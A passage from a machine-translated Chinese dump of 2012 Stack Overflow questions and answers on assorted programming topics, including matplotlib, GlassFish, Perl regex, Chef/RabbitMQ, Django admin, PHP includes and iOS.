from matplotlib import cm
color = cm.inferno_r(np.linspace(.4, .8, 30))
color

array([[ 0.865006,  0.316822,  0.226055,  1\.      ],
       [ 0.851384,  0.30226 ,  0.239636,  1\.      ],
       [ 0.832299,  0.283913,  0.257383,  1\.      ],
       [ 0.817341,  0.270954,  0.27039 ,  1\.      ],
       [ 0.796607,  0.254728,  0.287264,  1\.      ],
       [ 0.775059,  0.239667,  0.303526,  1\.      ],
       [ 0.758422,  0.229097,  0.315266,  1\.      ],
       [ 0.735683,  0.215906,  0.330245,  1\.      ],
       ..... 
```

然后我们可以使用它来绘制，使用原始帖子中的数据：

```
import random
x = [{i: random.randint(1, 5)} for i in range(30)]
df = pd.DataFrame(x)
df.plot(kind='bar', stacked=True, color=color, legend=False, figsize=(12, 4)) 
```

[![在此处输入图像描述](../Images/010210a87027fbfc6cfdc240a10f87b7.png)](https://i.stack.imgur.com/lCU61.png)

# eclipse - glassfish 无效资源

> ID：11927716
> 
> 赞同：3
> 
> 时间：2012-08-13T03:03:03.240
> 
> 标签：eclipse, jakarta-ee, jpa, glassfish

我正在 Eclipse 中创建一个简单的 JPA 项目以在 glassfish 上运行。我收到以下错误：

```
cannot Deploy GuardApplicationEAR
Deployment Error for module: GuardApplicationEAR: Error occurred during deployment: Exception while preparing the app : Invalid resource : jdbc/_default__pm. Please see server.log for more details.
Exception while invoking class org.glassfish.persistence.jpa.JPADeployer prepare method : java.lang.RuntimeException: Invalid resource : jdbc/_default__pm
Invalid resource : jdbc/_default__pm 
```

我没有在我的项目中的任何地方定义 jdbc/ *default* _pm。有人可以帮忙吗。谢谢。

# ios - 如何将输出格式化为 UILabel 作为货币？

> ID：11927721
> 
> 赞同：0
> 
> 时间：2012-08-13T03:04:13.397
> 
> 标签：ios, numbers, format, uilabel, currency

因此，我正在开发一个小费计算器作为我的第一个自我引导的 iOS 应用程序，并且我希望能够输出到 UILabel 以显示货币格式的账单。例如，用户按 1，标签显示 $0.01，然后用户输入 2，标签显示 $0.12，用户输入 3，标签显示 $1.23，依此类推。目前，我正在从 UIButton 获取输入并更新显示，它们上面有这样的数字： `NSString *digit = sender.currentTitle; self.display.text = [self.display.text stringByAppendingString:digit];`

我在这里阅读了几个关于数字格式的问题并尝试了解决方案，但无法得到任何工作，但大多数解决方案都是针对 UITextFields 的，所以我在想我获取输入的方式可能存在问题？任何帮助将不胜感激。

*澄清一下，我要的是速度。我有一个小数点按钮，并且显示带有 $ 符号，但我想去掉小数点按钮，所以用户所要做的就是输入数字，甚至不用担心输入小数点。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T04:37:34.350

这是一个想法，为什么不将数字存储在美分/便士中 - 即货币的最小可能值。这样，如果用户按下另一个数字，您只需将现有数字乘以 10 并添加新数字。

一个例子：

*   用户按 1 => 数字之前是 0，所以新数字是 0 * 10 + 1 = 1
*   用户按 2 => 数字之前是 1，所以新数字是 1 * 10 + 2 = 12
*   用户按 3 => 数字之前是 12，所以新数字是 12 * 10 + 3 = 123

现在要显示这个，您所要做的就是将数字除以 100（或任何适合给定货币的值），然后在格式为 %0.01f 的字符串中使用结果

# android - 尝试对 Android 使用 copyPixelsFromBuffer 时出现“缓冲区不足以容纳像素”

> ID：11927723
> 
> 赞同：3
> 
> 时间：2012-08-13T03:04:52.803
> 
> 标签：android, bitmapfactory

我遇到以下代码片段的“引起：java.lang.RuntimeException：缓冲区不足以容纳像素”错误：

```
 String pathName = "/sdcard/test.bmp";
    Bitmap bm1 = BitmapFactory.decodeFile(pathName);

    ShortBuffer buffer = ShortBuffer.allocate(bm1.getWidth()*bm1.getHeight());
    bm1.copyPixelsToBuffer(buffer); 
```

我认为缓冲区足够大，因为它是根据位图的宽度和高度分配的。问题的原因可能是什么？

# jquery - Fancybox, Jquery Validate & position:absolute

> ID：11927729
> 
> 赞同：1
> 
> 时间：2012-08-13T03:06:07.373
> 
> 标签：jquery, css, jquery-plugins, fancybox, css-position

我有一个包含表单的fancybox [http://fancybox.net 。](http://fancybox.net)

在我运行 jQuery 验证插件的表单上：http: [//docs.jquery.com/Plugins/Validation/Validator](http://docs.jquery.com/Plugins/Validation/Validator)

错误消息使用 position:absolute 和上边距直接定位在输入下方。

```
var validator = $("#contact-us").validate({
        messages: {
            name: "Please enter your name",
            phone: "Please enter your phone number",
            email: "Please enter a valid e-mail address"
        }
    });

// Launch lightbox

$(".launch-form").fancybox({
    'speedIn'           :   500,
    'speedOut'          :   300,
    'overlayOpacity'    :   0.9,
    'overlayColor'      :   '#000',
    onComplete          :   function() {$('#cta-name').focus();},
    onCleanup           :   function() {validator.resetForm();}

});

label.error {
    background-color: #ae4136;
    color: #FFFFFF;
    font-size: 10px;
    margin-top: 30px;
    padding: 1px 5px 2px 5px;
    position: absolute;
    right: 21px;
    line-height:1.2;
    height:12px;
} 
```

一切都很好，除了当我第二次启动弹出窗口时生成错误消息（即：重置表单后）。消息显示低 30px：

![我第一次启动fancybox](../Images/b713ecb9bde5b3bdbaf25349dc607cdc.png) ![我第二次启动fancybox（即：清除插件后](../Images/e6f5bcecb5e36a4cbdecfbfba6b5a7b1.png)

关于为什么重新计算职位的任何想法？我正在使用 FF14，但同样的问题出现在 chrome 上。任何帮助表示赞赏！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T03:22:02.233

您尚未发布您的 HTML 标记，但`absolute`定位是相对于已`position: <anything other than static, eg. relative or absolute>`应用到它的最近的父元素。

你可以做两件事：

1.  **不要**使用定位，只使用`block`元素和`margin`
2.  将每个标签和字段包装在其**自己的**包含元素中，例如 a`div`或 a`fieldset`

# regex - perl 中的正则表达式验证 URL

> ID：11927730
> 
> 赞同：-1
> 
> 时间：2012-08-13T03:06:09.390
> 
> 标签：regex, perl, validation

我正在尝试完成我的任务，只有最后一个是验证 URL

要求如下：

url 只允许字母数字字符和以下 :/.~?=+& 两个句点不能连续存在。

这是我到目前为止所拥有的，但它不起作用

```
m|(?:([^:/?#]+):)?(?://([^/?#]*))?([^?#]*)(?:\?([^#]*))?(?:#(.*))?| 
```

那么现在发生了什么，我输入的任何东西都只是通过了我所做的匹配过程，就像这样

```
$return = $search =~ m|(?:([^:/?#]+):)?(?://([^/?#]*))?([^?#]*)(?:\?([^#]*))?(?:#(.*))?|; 
```

所以它总是对我返回 true，即使我只是在搜索框中输入任何内容。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-13T03:40:58.877

这是我从我的正则表达式湍流器中得到的（即将成为商业产品）

无组数

```
 (?:                                                 #(.*))?
      ( [^:/?\#]+ )
      :
 )?
 (?:
      //
      ( [^/?\#]* )
 )?
 ( [^?\#]* )
 (?:
      \?
      ( [^\#]* )
 )?
      (  <-- Unbalanced  '('
      ?: 
```

有组数

```
 (?:                                                 #(.*))?
1         ( [^:/?\#]+ )
          :
     )?
     (?:
          //
2         ( [^/?\#]* )
     )?
3    ( [^?\#]* )
     (?:
          \?
4         ( [^\#]* )
     )?
          (  <-- Unbalanced  '('
          ?: 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-13T03:29:24.780

也许工作如下：

```
use Data::Dumper;
$url = 'http://stackoverflow.com/questions/11927730/regular-expression-validate-url-in-perl';
@ds = $url =~ m|(?:([^:/?#]+):)?(?://([^/?#]*))?([^?#]*)(?:\?([^#]*))?(?:#(.*))?|;
print Dumper(\@ds); 
```

输出：

```
$VAR1 = [
          'http',
          'stackoverflow.com',
          '/questions/11927730/regular-expression-validate-url-in-perl',
          undef,
          undef
        ]; 
```

# rabbitmq - 通过 Chef 安装时出现 RabbitMQ 异常

> ID：11927734
> 
> 赞同：0
> 
> 时间：2012-08-13T03:06:48.580
> 
> 标签：rabbitmq, ubuntu-12.04, chef-infra, apt

我有一个非常简单的厨师食谱，它尝试在 EC2 和 Vagrant VM（都运行 Ubuntu 12.04）上安装 RabbitMQ 和几个 RabbitMQ 插件。

我正在使用 OpsCode RabbitMQ 食谱（https://github.com/opscode-cookbooks/rabbitmq），当我配置机器时，我得到以下堆栈跟踪：

```
INFO: Processing apt_repository[rabbitmq] action add (rabbitmq::default line 43)
INFO: Processing remote_file[/srv/chef/file_store/rabbitmq-signing-key-public.asc] action create (/srv/chef/file_store/cookbooks/apt/providers/repository.rb line 36)
INFO: remote_file[/srv/chef/file_store/rabbitmq-signing-key-public.asc] updated
INFO: remote_file[/srv/chef/file_store/rabbitmq-signing-key-public.asc] mode changed to 644
INFO: Processing execute[install-key rabbitmq-signing-key-public.asc] action run (/srv/chef/file_store/cookbooks/apt/providers/repository.rb line 52)
INFO: execute[install-key rabbitmq-signing-key-public.asc] ran successfully
INFO: apt_repository[rabbitmq] sending run action to execute[apt-get update] (immediate)
INFO: Processing execute[apt-get update] action run (apt::default line 29)
INFO: execute[apt-get update] ran successfully
INFO: Processing remote_file[/srv/chef/file_store/rabbitmq-signing-key-public.asc] action nothing (/srv/chef/file_store/cookbooks/apt/providers/repository.rb line 36)
INFO: Processing execute[install-key rabbitmq-signing-key-public.asc] action nothing (/srv/chef/file_store/cookbooks/apt/providers/repository.rb line 52)
INFO: Processing execute[apt-get update] action nothing (/srv/chef/file_store/cookbooks/apt/providers/repository.rb line 78)
INFO: Processing file[/etc/apt/sources.list.d/rabbitmq-source.list] action create (/srv/chef/file_store/cookbooks/apt/providers/repository.rb line 89)
INFO: file[/etc/apt/sources.list.d/rabbitmq-source.list] created file /etc/apt/sources.list.d/rabbitmq-source.list
INFO: Processing package[util-linux] action install (rabbitmq::default line 53)
INFO: Processing package[rabbitmq-server] action install (rabbitmq::default line 54)
ERROR: package[rabbitmq-server] (rabbitmq::default line 54) has had an error
...
FATAL: Chef::Exceptions::Exec: package[rabbitmq-server] (rabbitmq::default line 54) had an error: Chef::Exceptions::Exec: apt-get -q -y install rabbitmq-server=2.7.1-0ubuntu4 returned 100, expected 0 
```

正如您从日志中看到的那样，在`apt-get update`添加新的 rabbitmq 源之前正在发生这种情况（这意味着它尝试安装 rabbitmq-server 版本 2.7.1 与 RabbitMQ 存储库中的 2.8.x 版本。

这是食谱代码：[https ://github.com/opscode-cookbooks/rabbitmq/blob/master/recipes/default.rb#L43-54](https://github.com/opscode-cookbooks/rabbitmq/blob/master/recipes/default.rb#L43-54)

任何想法如何解决这个问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T22:49:32.547

我有你需要的 2 个修复。

添加新存储库时，apt_repository 没有启动适当的 apt-get 更新。 [http://tickets.opscode.com/browse/COOK-1530](http://tickets.opscode.com/browse/COOK-1530)有修复。

rabbitmq 的 apt_repository 没有触发 apt-get 更新 [http://tickets.opscode.com/browse/COOK-1496](http://tickets.opscode.com/browse/COOK-1496)，而 apt 食谱更新修复了它。今天已合并到[https://github.com/opscode-cookbooks/rabbitmq](https://github.com/opscode-cookbooks/rabbitmq) master。

两本食谱的新版本应该可以解决所有问题，希望这周。在此期间，请随时从 github 获取，如有任何进一步的问题，请联系我。

马特@opscode

# string - strip.text 'facet grid' 中的回车

> ID：11927735
> 
> 赞同：-1
> 
> 时间：2012-08-13T03:06:55.193
> 
> 标签：string, r, ggplot2, carriage-return, cran

请如何在条形文本中插入回车（`ggplot`2.0.9）

我试过了 ：

```
mf_labeller <- function(var, value){
  value <- as.character(value)
    if (var=="Nerves") { 
    value[value=="xv1"] <- c("xv","/r", "1")
    value[value=="xv2"]   <- c("xv","/r", "2")

  }
  return(value)
} 

facet_grid(..., labeller=mf_labeller) 
```

它返回

```
Warning in value[value == "xv1"] <- c("xv","/r", "1") : number of items to replace is not a multiple of replacement length
Warning in value[value == "xv2"] <- c("xv","/r", "2") : number of items to replace is not a multiple of replacement length 
```

图中只有“xv”“xv”

谢谢你的帮助

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-13T03:59:12.500

贴标机告诉您它需要一个长度为 1 的字符串，并且只返回第一个元素。

请注意，我已替换`/r`为新行`\n`

```
mf_labeller <- function(var, value){
  value <- as.character(value)
    if (var=="Nerves") { 
    value[value=="xv1"] <-  paste("xv","\n", "1")
    value[value=="xv2"]   <- paste("xv","\n", "2")

  }
  return(value)
} 
```

我认为应该可以使用正则表达式/字符串拆分方法来做到这一点。这行得通（但我确信有更好的）

```
mf_labeller <- function(var, value){
  value <- as.character(value)
  if (var=="Nerves") { 
    unscramble <- unlist(strsplit(split = '',value))
    value <- paste(paste0(unscramble[1:2],collapse=''), '\n', unscramble[3])

  }
  return(value)
} 
```

# backbone.js - Backbone Marionette CompositeView 渲染/使用

> ID：11927743
> 
> 赞同：0
> 
> 时间：2012-08-13T03:08:17.927
> 
> 标签：backbone.js, marionette

我一定是做错了什么，因为我无法让 CompositeView 的非集合部分使用指定的模板进行渲染。无论我如何尝试指定模板，它都不会按预期呈现。

[根据https://github.com/derickbailey/backbone.marionette/blob/master/docs/marionette.compositeview.md](https://github.com/derickbailey/backbone.marionette/blob/master/docs/marionette.compositeview.md)上的文档

我尝试提供一个指向存储在脚本标签中的模板的字符串，以及一个预编译的模板作为模板参数，如下所示：

```
 Backbone.CompositeView.extend({
        template: _.template( "<div><span class='items'></span></div>" )
    }); 
```

这是 jsfiddle 的现场尝试：http: [//jsfiddle.net/2PgrS/4/](http://jsfiddle.net/2PgrS/4/)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-13T04:06:37.687

您从未渲染过您的视图。

```
 var view = new MyCompositeView({
        collection: collection
    });

    // render the view  
    view.render();

   view.$el.appendTo( "body" ); 
```

[http://jsfiddle.net/derickbailey/XJLxv/1/](http://jsfiddle.net/derickbailey/XJLxv/1/)

# python - 使用元素树在 Python 中解析 XML

> ID：11927744
> 
> 赞同：0
> 
> 时间：2012-08-13T03:08:52.097
> 
> 标签：python, xml, elementtree

我正在使用 Python 和 ElementTree 来解析 XML 文件。我希望能够制作一个包含所有 CD 信息的字典列表。稍后我可以使用此列表来收集信息，例如显示来自美国的 CD 的标题。`YEAR`下面的代码可以正常工作，但如果标签不是 CD 的最后一个标签，则很容易被破坏。如何重写此代码以便标签可以按任何顺序排列？

```
from xml.etree.ElementTree import ElementTree

f = open("cd_catalog.xml")
tree = ElementTree()
tree.parse(f)

catalog = []
cd = {}
for node in tree.iter():
    if node.tag != "CD" and node.tag != "CATALOG":
        tagtext = (node.tag,node.text),
        cd.update(tagtext)
    if node.tag == "YEAR":
        catalog.append(cd)
        cd = {}

for cd in catalog:
    if cd["COUNTRY"] == "USA":
        print("The cd named {0} is from USA".format(cd["TITLE"])) 
```

xml文件的2个条目：

```
<CATALOG>
    <CD>
        <TITLE>Empire Burlesque</TITLE>
        <ARTIST>Bob Dylan</ARTIST>
        <COUNTRY>USA</COUNTRY>
        <COMPANY>Columbia</COMPANY>
        <PRICE>10.90</PRICE>
        <YEAR>1985</YEAR>
    </CD>
    <CD>
        <TITLE>Hide your heart</TITLE>
        <ARTIST>Bonnie Tyler</ARTIST>
        <COUNTRY>UK</COUNTRY>
        <COMPANY>CBS Records</COMPANY>
        <PRICE>9.90</PRICE>
        <YEAR>1988</YEAR>
    </CD>
</CATALOG> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-13T08:33:06.027

以下是重写 XML 解析代码的一种方法。在此，我定义了一个生成器，它循环遍历`CD`根元素的所有元素（我不检查这是一个`CATALOG`元素，尽管您可以添加该检查）。此生成器将每个元素的所有子`CD`元素作为字典返回。

使用生成器比构建所有`CD`元素的字典更有效，特别是当您的 XML 文件非常大时，因为您只`CD`在内存中存储一​​个元素。

```
import xml.etree.ElementTree as etree

def get_cd(element):
    try:
        for el in element.iter(tag='CD')
            yield get_cd_info(el)
    except AttributeError:
        # Python < 2.7
        for el in element.getiterator(tag='CD')
            yield get_cd_info(el)

def get_cd_info(element):
    return {'title':element.findtext('TITLE'),
        'artist':element.findtext('ARTIST'),
        'country':element.findtext('COUNTRY'),
        'company':element.findtext('COMPANY'),
        'price':element.findtext('PRICE),
        'year':element.findtext('YEAR')} 
```

以下是上述方法的实际效果：

```
s = '''<CATALOG>
    <CD>
        <TITLE>Empire Burlesque</TITLE>
        <ARTIST>Bob Dylan</ARTIST>
        <COUNTRY>USA</COUNTRY>
        <COMPANY>Columbia</COMPANY>
        <PRICE>10.90</PRICE>
        <YEAR>1985</YEAR>
    </CD>
    <CD>
        <TITLE>Hide your heart</TITLE>
        <ARTIST>Bonnie Tyler</ARTIST>
        <COUNTRY>UK</COUNTRY>
        <COMPANY>CBS Records</COMPANY>
        <PRICE>9.90</PRICE>
        <YEAR>1988</YEAR>
    </CD>
</CATALOG>
'''

e = etree.fromstring(s)

for cd in get_cd(e):
    if cd['country'] == 'USA':
        print('The cd "{0}" is from the USA.'.format(cd['title']))

# prints 'The cd "Empire Burlesque" is from the USA.' 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-13T04:25:37.133

未经测试：

```
....
for CD in tree.findall('cd'):
   for node in CD.finditer():
       print node.tag # TITLE, ARTIST, PRICE etc.

..... 
```

# javascript - 定义这些对象有什么区别？

> ID：11927749
> 
> 赞同：3
> 
> 时间：2012-08-13T03:09:39.673
> 
> 标签：javascript

这些有什么区别？

```
var person = {
    age: 25,
    name: "David"
};

var person = (function() {
    var name = "David", age = 25;
}()); 
```

我的问题真的是，有什么作用`(function(){}())`？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-13T03:13:39.570

**做什么`(function(){}())`？**

这实质上是创建一个匿名函数，然后执行它。一个常见的用途是限制全局变量。

例如，以下将具有三个全局变量（`var1`、`var2`和`var3`）：

```
var var1 = "a", var2 = "b", var3 = "c"; 
```

如果将这些声明包装在匿名函数中，它们仍然可以作为匿名函数中的局部变量访问，但不会混淆全局命名空间。例如：

```
(function() {
    var var1 = "a", var2 = "b", var3 = "c";
    console.log(var1); // interact with local variables
})(); // execute function. 
```

* * *

**这些有什么区别？**

```
var person = {
    age: 25,
    name: "David"
}; 
```

如果此代码包含在函数中，它会创建一个名为 的局部变量`person`。否则，它会创建一个名为 的全局变量`person`。

```
var person = (function() {
    var name = "David", age = 25;
}()); 
```

此代码创建并执行一个匿名函数，然后将该匿名函数的返回码分配给变量`person`。由于匿名函数没有返回值，因此变量`person`的值为`undefined`. 就目前而言，这条语句在功能上等同于`var person;`，因为匿名函数没有副作用，也没有返回值。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-08-13T03:15:20.393

```
var person = (function() {
    var name = "David", age = 25;
}()); 
```

person will be `undefined`，因为该函数没有`return`声明。

它只是一个自我执行的匿名函数，您可以如下图所示。

```
function foo() {
  var name = "David", age = 25;
}
var person = foo(); 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-08-13T03:13:18.770

它执行您刚刚创建的匿名函数。

这种技术很有用，因为它允许您在类中限定成员。

如果您正在寻找一种进行类和继承的好方法，请查看[http://ejohn.org/blog/simple-javascript-inheritance/](http://ejohn.org/blog/simple-javascript-inheritance/)

我还建议将您的类定义为 AMD 模块。

# c# - 如何使 GridView 在 wpf 中支持多选

> ID：11927751
> 
> 赞同：2
> 
> 时间：2012-08-13T03:09:43.830
> 
> 标签：c#, wpf, gridview

这是我的 wpf 文件。我希望`GridView`支持多项选择。

```
 <ListView Name="deviceListBox"
                  Width="630"
                  Height="282"
                  HorizontalAlignment="Center"
                  VerticalAlignment="Center"
                  ItemsSource="{Binding Items}"
                  SelectionChanged="deviceListBox_SelectionChanged"
                  SelectionMode="Single">
            <ListView.View>
                <GridView>
                    <GridView.Columns>
                        <GridViewColumn>
                            <GridViewColumn.HeaderTemplate>
                                <DataTemplate>
                                    <Label Width="15"
                                           Height="25"
                                           Margin="10,0,0,0"
                                           HorizontalAlignment="center"
                                           VerticalAlignment="Center" />
                                </DataTemplate>
                            </GridViewColumn.HeaderTemplate>
                            <GridViewColumn.CellTemplate>
                                <DataTemplate>
                                    <Grid>
                                        <controls:PresenceIndicator Width="35"
                        Height="30"
                        Margin="7,0,0,0"
                        HorizontalAlignment="center"
                        VerticalAlignment="Center"
                        PhotoDisplayMode="Large"
                        SingleClickAction="ShowContactDetails"
                        Source="{Binding Path=SipURI}" />
                                    </Grid>
                                </DataTemplate>
                            </GridViewColumn.CellTemplate>
                        </GridViewColumn>
                        <GridViewColumn>
                            <GridViewColumn.HeaderTemplate>
                                <DataTemplate>
                                    <Label Width="95"
                                           Height="25"
                                           Margin="10,0,0,0"
                                           HorizontalAlignment="Left"
                                           VerticalAlignment="Center"
                                           Content="Username"
                                           Foreground="Black" />
                                </DataTemplate>
                            </GridViewColumn.HeaderTemplate>
                            <GridViewColumn.CellTemplate>
                                <DataTemplate>
                                    <Grid>
                                        <Label Height="30"
                                               Margin="7,0,0,0"
                                               HorizontalAlignment="left"
                                               VerticalAlignment="Center"
                                               Content="{Binding Path=Username}"
                                               Foreground="Black" />
                                    </Grid>
                                </DataTemplate>
                            </GridViewColumn.CellTemplate>
                        </GridViewColumn>
                        <GridViewColumn> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T03:16:11.587

将您的 SelectionMode 更改为`Multiple`或`Extended`。请参阅[此 MSDN 帖子](http://msdn.microsoft.com/en-us/library/system.windows.controls.selectionmode.aspx)

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-08-13T03:16:18.523

设置[DataGrid.SelectionMode](http://msdn.microsoft.com/en-us/library/system.windows.controls.datagrid.selectionmode%28VS.95%29.aspx)：

```
<DataGrid SelectionMode="Single" ... 
```

# django - 在 django admin 中显示模型的 __unicode__

> ID：11927754
> 
> 赞同：24
> 
> 时间：2012-08-13T03:09:52.050
> 
> 标签：django, django-admin

我想在 Django Admin 界面中显示模型的用户名，但不太确定该怎么做。

```
The models.py:

    class Adult(models.Model):    
        user = models.OneToOneField(User)
        fullname = models.CharField(max_length=100,
                                    blank=True)
        def __unicode__(self):
            return self.user.username

Admin.py:

    class AdultAdmin(admin.ModelAdmin):
        list_display = ('??', 'Student_Name',)
        search_fields = ['??',]

    admin.site.register(Adult, AdultAdmin) 
```

里面应该放什么？？多于 ？我想显示 unicode 还是 self.user.username？我该怎么做？需要一些指导...

* * *

## 回答 #1

> 赞同：48
> 
> 时间：2012-08-13T06:12:35.243

从[`list_display`文档](https://docs.djangoproject.com/en/dev/ref/contrib/admin/#django.contrib.admin.ModelAdmin.list_display)中，您可以在其中添加四件事：

1.  一个领域
2.  某种方法（可调用）接受一个变量，该变量是显示行的实例。
3.  一个字符串，它是模型类中定义的方法或属性的名称。
4.  一个字符串，它是在 中定义的方法的名称`ModelAdmin`。

对于您的情况，我们需要 #3 for `list_display`。

为了[`search_fields`](https://docs.djangoproject.com/en/dev/ref/contrib/admin/#django.contrib.admin.ModelAdmin.search_fields)更容易，您可以使用以下符号 ( `__`) 进行查找。

最后我们想出了这个：

```
class AdultAdmin(admin.ModelAdmin):
    list_display = ('__unicode__', 'Student_Name',)
    search_fields = ['user__username'] 
```

# python - 如何在 Pyramid 的 URI 中找到锚点？

> ID：11927755
> 
> 赞同：5
> 
> 时间：2012-08-13T03:10:13.043
> 
> 标签：python, uri, anchor, pyramid

简单地说，在 Pyramid 中，当有人请求页面时，例如：

```
/foo/#bar 
```

如何找出锚点是什么？在这种情况下，它将是`bar`。这似乎应该是微不足道的，但我不确定如何在 Pyramid 中检索这些信息。

`request.current_route_path()`，`request.url`并且`request.path`只会`/foo/`在这种情况下返回。

（Pyramid 实际上完全没有意识到这一点吗？也许服务器根本就不会收到这些信息，而我直到现在才意识到这一点）

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-08-13T03:47:57.337

客户端永远不会将片段发送到服务器；您将需要使用 JavaScript 在客户端处理它。

# php - 使用 PHP 包含时如何避免空格？

> ID：11927757
> 
> 赞同：2
> 
> 时间：2012-08-13T03:10:26.380
> 
> 标签：php, include

我有一些文件需要包含在几个页面中，所以我使用类似

```
<html>
<head>
<title>This is a webpage</title>
</head>
<body>
<div>Hello, this is a webpage</div>
<?php include("header.html");?>
<div>Some more text.</div>
<?php include("BlockToInclude.php");?>
<div>Even more text.</div>
<?php include("footer.html");?>
</body>
</html> 
```

问题是，每次`include();`我在包含的内容之前得到一个 20px 的空白空间。我通过将第一个包含块的边距减少 20px 来解决这个问题，但我更喜欢避免这个空间而不是补偿它的东西。另外，我对 PHP 有点陌生，这是正常行为还是我应该寻找我做错了什么？

更新：我检查了生成的代码，在我调用函数的每个地方，`insert();`它都出现了一个不在原始文件中的陌生字符（也不是调用者或包含的）。我将代码从 Firefox 代码查看器（不可见）复制到我的编辑器（Windows 中的 RJ TextEd），它在框中显示为问号；如果我将此代码保存为静态 html，它会呈现相同的内容，但如果我删除这些字符，那么空白空间就会消失。有什么想法吗？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-08-13T03:26:58.470

我在这里找到了这个话题

有人说：

我以前遇到过这个问题。确保您以 ASCII 格式而不是二进制格式上传文件。有时，对于某些 FTP 服务器，您必须手动设置。还可以尝试在文本编辑器中将换行符转换为“\n”。让我知道您使用的是哪个编辑器，我会给您更具体的说明。

[http://forums.digitalpoint.com/showthread.php?t=957679](http://forums.digitalpoint.com/showthread.php?t=957679)

有人解决了它：我使用notepad++（[http://notepad-plus.sourceforge.net/](http://notepad-plus.sourceforge.net/)）解决了这个问题，用notepad++打开php文件，在格式菜单中选择utf-8编码，没有BOM并保存。

希望这有助于

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-13T03:12:59.093

包含文件的末尾有空格吗？默认情况下，PHP 不会从 include 指令中创建任何空格，除非后面有空格，例如

没有空格：

```
<?php include('x'); ?>
</div> 
```

将包括一行空格：

```
<?php include('x'); ?>

</div> 
```

如果包含的文件末尾有空格，则会得到输出。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-01-10T17:20:08.170

不完全相同，但相似：

在我的包含文件的位置，我的 html 中出现了一个神秘的“1”。

这是一个简单而愚蠢的错误，我将包含放在使用短标签中，例如：

```
<?=include('social-media-box.php')?> 
```

而不是正确地：

```
<?php include('social-media-box.php'); ?> 
```

无论出于何种原因，这都会导致“1”出现。无论如何，使用完整的 php 标签摆脱了它。

希望它可以帮助某人。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2014-10-30T16:15:15.093

我在这里回答了类似的情况： [https ://stackoverflow.com/a/26658129/292060](https://stackoverflow.com/a/26658129/292060)

问题是带有 BOM 字符的 UTF-8 编码，这导致了空格。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-08-13T03:34:40.273

它的 html 行为，因为你把 include 放在 div 标签下，试着把它放在它旁边。你的代码会是这样的

```
...</div><?php include("file.php") ?> 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-08-13T03:37:32.170

这可能会帮助您找到和减少空白。

1.  查看源代码，看看您是否可以找出哪些包含的文件正在创建空白。

2.让你的 div 块带有边框颜色，这样你就知道你的 div 块占用了多少空间。

1.  看看你是否可以让你的包含文件的代码没有任何空格或额外的行。您可以压缩包含的文件

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2013-10-11T11:22:48.337

将此规则放在 CSS 的开头，它将禁用页面中元素的默认填充和边距。

```
*
{
    margin: 0;
    padding: 0;
} 
```

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2015-11-09T21:06:10.610

放在前面`<!DOCTYPE...`

像这样的代码：

```
<?php include "config.php"; ?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"> 
```

并编写您的页面代码...

# ios - 从 tableviewcell 内的 UIButton 发送推文 - iOS

> ID：11927759
> 
> 赞同：0
> 
> 时间：2012-08-13T03:10:37.437
> 
> 标签：ios, xcode, uitableview

我试图`IBAction`从一个`UITableViewCell`内部有按钮的子类中触发它。`TWTweetComposeViewController`由于这行代码， 我无法得到：

```
[self presentModalViewController:tweetSheet animated:YES]; 
```

是否可以通过按单元格上的按钮打开推文窗口？

```
- (IBAction)tweetTapped:(id)sender { 
{
if ([TWTweetComposeViewController canSendTweet])
{
    TWTweetComposeViewController *tweetSheet = 
        [[TWTweetComposeViewController alloc] init];
    [tweetSheet setInitialText:
        @"Tweeting from iOS 5 By Tutorials! :)"];
    [self presentModalViewController:tweetSheet animated:YES];
}
else
{
    UIAlertView *alertView = [[UIAlertView alloc] 
        initWithTitle:@"Sorry"                                                             
        message:@"You can't send a tweet right now, make sure  
            your device has an internet connection and you have 
            at least one Twitter account setup"                                                          
        delegate:self                                              
        cancelButtonTitle:@"OK"                                                   
        otherButtonTitles:nil];
    [alertView show];
  }

} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T06:32:14.280

正如@rdelmar 提到的，`presentModalViewController`是一种`UIViewController`not的方法，`UITableViewCell`所以你不应该`[self presentModalViewController:tweetSheet animated:YES]`从你的子类调用`UITableViewCell`.

相反，您的`UITableViewCell`子类应该通知视图控制器其表视图（可能是 的子类`UITableViewController`）来呈现`tweetSheet`. 一种方法是向您的`UITableViewCell`子类添加一个委托，当用户想要发推文时，该委托就会被通知。将此委托设置为您的`UITableViewController`子类，并通过显示工作表让它处理推文请求。封闭的代表`UITableView`可能已经是您的`UITableViewController`子类，因此完成相同事情的一种快速而肮脏的方法可能是将您必须的行更改为以下内容：

```
[self.superview.delegate presentModalViewController:tweetSheet animated:YES]; 
```

注意：`presentModalViewController:animated:`在 iOS 5 中已弃用，`presentViewController:animated:completion:`最好直接替代。

# ios - 如何根据来自多个 Core Data 属性的计算值进行排序

> ID：11927762
> 
> 赞同：2
> 
> 时间：2012-08-13T03:11:13.980
> 
> 标签：ios, core-data, nsfetchrequest, nssortdescriptor

